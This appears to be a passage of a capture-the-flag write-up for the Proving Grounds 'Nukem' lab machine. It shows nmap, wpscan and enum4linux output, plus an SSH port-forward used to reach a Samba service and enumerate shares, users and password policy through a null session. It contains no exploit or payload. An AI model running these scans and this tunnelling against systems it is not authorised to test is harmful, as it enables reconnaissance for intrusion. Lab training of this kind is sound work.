# Nukem

# Enumeration

## nmap

```
# Nmap 7.91 scan initiated Thu Feb 17 07:24:18 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nukem/results/192.168.108.105/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nukem/results/192.168.108.105/scans/xml/_full_tcp_nmap.xml" 192.168.108.105
adjust_timeouts2: packet supposedly had rtt of -149680 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -149680 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -194394 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -194394 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -220688 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -220688 microseconds.  Ignoring time.
Nmap scan report for 192.168.108.105
Host is up, received user-set (0.19s latency).
Scanned at 2022-02-17 07:24:19 EST for 675s
Not shown: 65529 filtered ports
Reason: 65529 no-responses
PORT      STATE SERVICE     REASON         VERSION
22/tcp    open  ssh         syn-ack ttl 63 OpenSSH 8.3 (protocol 2.0)
| ssh-hostkey: 
|   3072 3e:6a:f5:d3:30:08:7a:ec:38:28:a0:88:4d:75:da:19 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIa7leEeVssjdrJAMl1xs+qCC7DvEgvhDmYxn7oFKkzQdWQXNwPDaf19b+8uxImEAQ3uRXYg56MItfQ54pTuDpJSuuSfCXyqH9/o5S+gugCgkGiWRTlyXAmCe4uM4ZZD09yChsJ0LdPKvqM19l5o+8KCBuXAGOX7Co60oUpD3+xINAS/XQYFdY1RARpIsuzd3qUHkeKJvGp2hbI6b2bgfcjTcPgBaLKLMa6OZ208whcHdYwJdOnc2m3mi2o9v+ETK+P8exJ1/DTIYLLVlo0BPMqlCE2R4JyEfp8RQeggq42yHOMmBI6pQ/BhClgheiPDhF+hQLNafLgkLeHv625eFq7V8bwi2Uy7/NV8jip1FobFhaT2L/MiRHnx7my4Cxk0BzoAvj0fOzOXouT5rMon6o14x/HTQBqORFhLvTNkCnPE0nen8ohQ05R0oWFiVwH74OaLHvwmzUuy8d1Wln5rW26q+UjZy1AIGpRHvyfEV5dzmB0ujnrE8Io702tIb/ssM=
|   256 43:3b:b5:bf:93:86:68:e9:d5:75:9c:7d:26:94:55:81 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLFrQmyRArhVBZ7HJi6W3YN/7sFuTBg5RLoffgVyCRaVpqj/VAwL3c85iE7s1x61oRu7CiVIvzOcYAMh5BfOjuI=
|   256 e3:f7:1c:ae:cd:91:c1:28:a3:3a:5b:f6:3e:da:3f:58 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWYiSpSV5PFfFK8fw7UZ1MAMHej2xBONdUi5CSr7huF
80/tcp    open  http        syn-ack ttl 63 Apache httpd 2.4.46 ((Unix) PHP/7.4.10)
|_http-generator: WordPress 5.5.1
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-server-header: Apache/2.4.46 (Unix) PHP/7.4.10
|_http-title: Retro Gamming &#8211; Just another WordPress site
3306/tcp  open  mysql?      syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, HTTPOptions, Hello, Help, Kerberos, NULL, RPCCheck, RTSPRequest, SSLSessionReq, SSLv23SessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|_    Host '192.168.49.108' is not allowed to connect to this MariaDB server
| mysql-info: 
|_  MySQL Error: Host '192.168.49.108' is not allowed to connect to this MariaDB server
5000/tcp  open  http        syn-ack ttl 63 Werkzeug httpd 1.0.1 (Python 3.8.5)
|_http-server-header: Werkzeug/1.0.1 Python/3.8.5
|_http-title: 404 Not Found
13000/tcp open  http        syn-ack ttl 63 nginx 1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.18.0
|_http-title: Login V14
36445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 4.6.2
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.91%I=9%D=2/17%Time=620E40BC%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108'\x20is\x20not\x20al
SF:lowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(GenericLi
SF:nes,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(HTTPOpti
SF:ons,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RTSPRequ
SF:est,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108'\x20is\x20not\x20a
SF:llowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(RPCCheck
SF:,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108'\x20is\x20not\x20allo
SF:wed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DNSVersionB
SF:indReqTCP,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108'\x20is\x20no
SF:t\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(DN
SF:SStatusRequestTCP,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108'\x20
SF:is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serve
SF:r")%r(Hello,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108'\x20is\x20
SF:not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(
SF:Help,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108'\x20is\x20not\x20
SF:allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(SSLSess
SF:ionReq,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108'\x20is\x20not\x
SF:20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(Termi
SF:nalServerCookie,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108'\x20is
SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"
SF:)%r(TLSSessionReq,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108'\x20
SF:is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20serve
SF:r")%r(SSLv23SessionReq,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108
SF:'\x20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20
SF:server")%r(Kerberos,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108'\x
SF:20is\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20ser
SF:ver")%r(X11Probe,4D,"I\0\0\x01\xffj\x04Host\x20'192\.168\.49\.108'\x20i
SF:s\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server
SF:");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|5.X (85%)
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 4.15 - 5.6 (85%), Linux 5.0 - 5.3 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=2/17%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=620E4117%P=x86_64-pc-linux-gnu)
SEQ(SP=FB%GCD=1%ISR=10B%TI=Z%II=I%TS=A)
SEQ(SP=FB%GCD=1%ISR=10B%TI=Z%TS=C)
OPS(O1=M54EST11NW7%O2=M54EST11NW7%O3=M54ENNT11NW7%O4=M54EST11NW7%O5=M54EST11NW7%O6=M54EST11)
WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)
ECN(R=Y%DF=Y%TG=40%W=FAF0%O=M54ENNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 1.950 days (since Tue Feb 15 08:47:54 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=251 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   187.41 ms 192.168.49.1
2   187.49 ms 192.168.108.105

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 17 07:35:35 2022 -- 1 IP address (1 host up) scanned in 678.34 seconds
```

## 80 - Web

wpscan --url http://192.168.108.105:80/ --no-update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nukem/results/192.168.108.105/scans/tcp_80_http_wpscan.txt"

### Wordpress

```bash
┌──(kali㉿kali)-[/tmp]
└─$ wpscan --url http://192.168.108.105:80/ --no-update -e vp,vt,tt,cb,dbe,u,m --plugins-detection aggressive --plugins-version-detection aggressive -f cli-no-color 2>&1 | tee "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Nukem/results/192.168.108.105/scans/tcp_80_http_wpscan.txt"
WARNING: Nokogiri was built against libxml version 2.9.10, but has dynamically loaded 2.9.12
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.108.105/ [192.168.108.105]
[+] Started: Thu Feb 17 22:09:17 2022

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.46 (Unix) PHP/7.4.10
 |  - X-Powered-By: PHP/7.4.10
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.108.105/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

[+] WordPress readme found: http://192.168.108.105/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.108.105/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://192.168.108.105/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5.1 identified (Insecure, released on 2020-09-01).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.108.105/index.php/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>
 |  - http://192.168.108.105/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.5.1</generator>

[+] WordPress theme in use: news-vibrant
 | Location: http://192.168.108.105/wp-content/themes/news-vibrant/
 | Last Updated: 2021-02-27T00:00:00.000Z
 | Readme: http://192.168.108.105/wp-content/themes/news-vibrant/readme.txt
 | [!] The version is out of date, the latest version is 1.0.13
 | Style URL: http://192.168.108.105/wp-content/themes/news-vibrant/style.css?ver=1.0.1
 | Style Name: News Vibrant
 | Style URI: https://codevibrant.com/wpthemes/news-vibrant
 | Description: News Vibrant is a modern magazine theme with creative design and powerful features that lets you wri...
 | Author: CodeVibrant
 | Author URI: https://codevibrant.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.12 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://192.168.108.105/wp-content/themes/news-vibrant/style.css?ver=1.0.1, Match: 'Version:            1.0.12'

[+] Enumerating Vulnerable Plugins (via Aggressive Methods)

 Checking Known Locations -: |=========================================================================================================================================|
[+] Checking Plugin Versions (via Aggressive Methods)

[i] No plugins Found.

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)

 Checking Known Locations -: |=========================================================================================================================================|
[+] Checking Theme Versions (via Passive and Aggressive Methods)

[i] No themes Found.

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)

 Checking Known Locations -: |=========================================================================================================================================|

[i] No Timthumbs Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)

 Checking Config Backups -: |==========================================================================================================================================|

[i] No Config Backups Found.

[+] Enumerating DB Exports (via Passive and Aggressive Methods)

 Checking DB Exports -: |==============================================================================================================================================|

[i] No DB Exports Found.

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)

 Brute Forcing Attachment IDs -: |==================================================w===================================================================================|

[i] Medias(s) Identified:

[+] http://192.168.108.105/?attachment_id=14
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.108.105/?attachment_id=18
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] http://192.168.108.105/?attachment_id=19
 | Found By: Attachment Brute Forcing (Aggressive Detection)

[+] Enumerating Users (via Passive and Aggressive Methods)

 Brute Forcing Author IDs -: |=========================================================================================================================================|

[i] User(s) Identified:

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.108.105/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Feb 17 22:14:25 2022
[+] Requests Done: 6547
[+] Cached Requests: 10
[+] Data Sent: 1.816 MB
[+] Data Received: 1.718 MB
[+] Memory used: 262.129 MB
[+] Elapsed time: 00:05:07
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```


### Creating Account and Testing

created an Instructor account
![](Pasted%20image%2020220218112546.png)

![](Pasted%20image%2020220218112352.png)

![](Pasted%20image%2020220218112613.png)

### Listing Uploads - SImple File List

![](Pasted%20image%2020220218113001.png)

![](Pasted%20image%2020220218113024.png)

## 5000 - Web

![](Pasted%20image%2020220217212939.png)

## 13000 - Web

![](Pasted%20image%2020220217213747.png)

![](Pasted%20image%2020220217213849.png)

![](Pasted%20image%2020220217214138.png)

## 36445 - Samba

```bash
┌──(kali㉿kali)-[~]
└─$ sudo nmap 192.168.108.105 -p 36445 -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-17 21:01 EST
Nmap scan report for 192.168.108.105
Host is up (0.18s latency).

PORT      STATE SERVICE     VERSION
36445/tcp open  netbios-ssn Samba smbd 4.6.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 57.55 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$
```

### Pivot and enum4linux

```bash
┌──(kali㉿kali)-[~]
└─$ sudo ssh kali@localhost -L 445:192.168.108.105:36445                                                                                                          130 ⨯
kali@localhost's password: 
Linux kali 5.10.0-kali3-amd64 #1 SMP Debian 5.10.13-1kali1 (2021-02-08) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Thu Feb 17 21:17:32 2022 from ::1
┏━(Message from Kali developers)
┃
┃ This is a minimal installation of Kali Linux, you likely
┃ want to install supplementary tools. Learn how:
┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
┃
┃ We have kept /usr/bin/python pointing to Python 2 for backwards
┃ compatibility. Learn how to change this and avoid this message:
┃ ⇒ https://www.kali.org/docs/general-use/python3-transition/
┃
┗━(Run “touch ~/.hushlogin” to hide this message)
┌──(kali㉿kali)-[~]
└─$ nmap localhost -p 445  
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-17 21:18 EST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000096s latency).
Other addresses for localhost (not scanned): ::1

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 0.05 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ enum4linux -a 127.0.0.1
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Feb 17 21:18:24 2022

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 127.0.0.1
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ================================================= 
|    Enumerating Workgroup/Domain on 127.0.0.1    |
 ================================================= 
[E] Can't find workgroup/domain


 ========================================= 
|    Nbtstat Information for 127.0.0.1    |
 ========================================= 
Looking up status of 127.0.0.1
No reply from 127.0.0.1

 ================================== 
|    Session Check on 127.0.0.1    |
 ================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.
[+] Server 127.0.0.1 allows sessions using username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.
[+] Got domain/workgroup name: 

 ======================================== 
|    Getting domain SID for 127.0.0.1    |
 ======================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.
Domain Name: WORKGROUP
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup

 =================================== 
|    OS information on 127.0.0.1    |
 =================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.
Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.
[+] Got OS info for 127.0.0.1 from smbclient: 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.
[+] Got OS info for 127.0.0.1 from srvinfo:
        NUKEM          Wk Sv PrQ Unx NT SNT Samba 4.12.6
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ========================== 
|    Users on 127.0.0.1    |
 ========================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
Use of uninitialized value $users in print at ./enum4linux.pl line 874.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 877.

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
Use of uninitialized value $users in print at ./enum4linux.pl line 888.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 890.

 ====================================== 
|    Share Enumeration on 127.0.0.1    |
 ====================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
do_connect: Connection to 127.0.0.1 failed (Error NT_STATUS_CONNECTION_REFUSED)

        Sharename       Type      Comment
        ---------       ----      -------
        Commander       Disk      Commander Files
        IPC$            IPC       IPC Service (Samba 4.12.6)
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 127.0.0.1
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//127.0.0.1/Commander   Mapping: OK, Listing: OK
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.
//127.0.0.1/IPC$        [E] Can't understand response:
lpcfg_do_global_parameter: WARNING: The "client use spnego" option is deprecated
lpcfg_do_global_parameter: WARNING: The "client ntlmv2 auth" option is deprecated
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*

 ================================================= 
|    Password Policy Information for 127.0.0.1    |
 ================================================= 


[+] Attaching to 127.0.0.1 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: [Errno Connection error (127.0.0.1:139)] [Errno 111] Connection refused

[+] Trying protocol 445/SMB...

[+] Found domain(s):

        [+] NUKEM
        [+] Builtin

[+] Password Info for Domain: NUKEM

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 

Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.

[+] Retieved partial password policy with rpcclient:

Password Complexity: Disabled
Minimum Password Length: 5


 =========================== 
|    Groups on 127.0.0.1    |
 =========================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting builtin groups:

[+] Getting builtin group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.

[+] Getting local groups:

[+] Getting local group memberships:
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.

[+] Getting domain groups:

[+] Getting domain group memberships:

 ==================================================================== 
|    Users on 127.0.0.1 via RID cycling (RIDS: 500-550,1000-1050)    |
 ==================================================================== 
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[I] Found new SID: S-1-22-1
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.
[I] Found new SID: S-1-5-21-1483841968-2450327315-592764595
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742.
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-5-21-1483841968-2450327315-592764595 and logon username '', password ''
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-500 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-501 NUKEM\nobody (Local User)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-502 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-503 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-504 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-505 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-506 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-507 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-508 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-509 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-510 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-511 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-512 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-513 NUKEM\None (Domain Group)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-514 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-515 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-516 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-517 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-518 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-519 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-520 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-521 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-522 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-523 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-524 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-525 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-526 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-527 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-528 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-529 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-530 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-531 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-532 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-533 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-534 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
S-1-5-21-1483841968-2450327315-592764595-535 *unknown*\*unknown* (8)
Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 834.
